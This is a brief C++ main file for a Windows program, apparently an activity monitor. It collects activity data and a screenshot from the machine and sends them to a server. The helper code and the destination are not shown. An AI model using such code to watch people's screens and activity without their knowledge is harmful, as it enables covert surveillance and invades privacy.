#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include "Config.h"
#include "ActivityMonitor.h"
#include "Screenshot.h"
#include "Network.h"
#include <windows.h>

int main() {
    auto info = ActivityMonitor::GetInfo();
    auto shot = Screenshot::Capture();
    if (!Network::Send(info, shot)) {
        OutputDebugStringA("[Sender] Failed to send data to server\n");
        return 1;
    }
    OutputDebugStringA("[Sender] Data sent successfully\n");
    return 0;
}
